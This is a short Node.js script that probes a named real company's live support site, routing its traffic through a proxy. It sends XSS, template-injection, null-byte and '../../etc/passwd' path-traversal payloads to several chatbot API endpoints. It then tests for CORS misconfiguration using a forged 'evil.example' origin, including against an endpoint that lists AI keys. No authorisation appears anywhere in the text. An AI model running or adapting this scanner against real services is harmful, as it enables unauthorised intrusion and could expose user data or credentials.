const {ProxyAgent,fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const payloads=['<script>alert(1)</script>','"><img src=x onerror=alert(1)>',"'+alert(1)+'",'${7*7}','%00','{{7*7}}','../../etc/passwd','en-US','EN','zh-CN'];
async function get(path,label,origin){try{const r=await fetch(B+path,{headers:{'user-agent':UA,origin:origin||B,referer:B+'/liveChat','x-bbl-official-site-region':'EN'},dispatcher:d,signal:AbortSignal.timeout(15000)});const t=await r.text();const h={acao:r.headers.get('access-control-allow-origin'),acac:r.headers.get('access-control-allow-credentials')};console.log(r.status,label,'|',JSON.stringify(h),'|',t.slice(0,260).replace(/\s+/g,' '));}catch(e){console.log('ERR',label,e.message)}}
(async()=>{
 for(const p of payloads){
  await get('/gw/robot/guide/menu/show?languageCode='+encodeURIComponent(p),'menu '+p);
  await get('/gw/robot/front/category/list?languageCode='+encodeURIComponent(p),'cat '+p);
  await get('/gw/robot/duty/roster/show?languageCode='+encodeURIComponent(p)+'&type=1','roster '+p);
  await get('/gw/robot/guide/show?type='+encodeURIComponent(p)+'&languageCode=en','guide '+p);
 }
 console.log('--- CORS ---');
 await get('/gw/robot/guide/menu/show?languageCode=en','cors-evil','https://evil.example');
 await get('/gw/robot/front/category/list?languageCode=en','cors-evil2','https://evil.example');
 await get('/gw/robot/duty/roster/show?languageCode=en&type=1','cors-evil3','https://evil.example');
 await get('/gw/robot/ai/key/list?languageCode=en','cors-evil4','https://evil.example');
})();
